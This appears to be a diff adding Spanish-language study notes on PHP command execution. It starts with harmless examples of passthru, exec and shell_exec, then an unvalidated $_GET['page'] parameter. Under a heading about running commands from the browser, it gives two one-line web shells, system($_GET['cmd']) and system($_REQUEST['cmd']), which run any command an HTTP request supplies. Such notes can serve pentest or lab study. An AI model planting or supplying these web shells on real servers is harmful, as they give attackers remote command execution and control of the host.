@@ -1,0 +1,34 @@
+1=Passthru
+<?php
+passthru ('echo $PATH');
+?>
+
+2=exec()
+<?php
+// imprime el nombre de usuario que tiene control del proceso php/httpd activo
+// (en un sistema con el ejecutable "whoami" disponible en la ruta)
+echo exec('whoami');
+?>
+
+3=shell_exec()
+<?php
+$salida = shell_exec('ls -lart');
+echo "<pre>$salida</pre>";
+?>
+
+3=<?php
+        // The page we wish to display
+        $file = $_GET[ 'page' ];
+ ?>;
+
+ejecutar comando desde la el navedor
+1=<?php
+        // The page we wish to display
+        system($_GET[ "cmd" ]);
+?>;
+    
+2=<?php
+        // The page we wish to display
+        system($_REQUEST[ "cmd" ]);
+?>;
+    
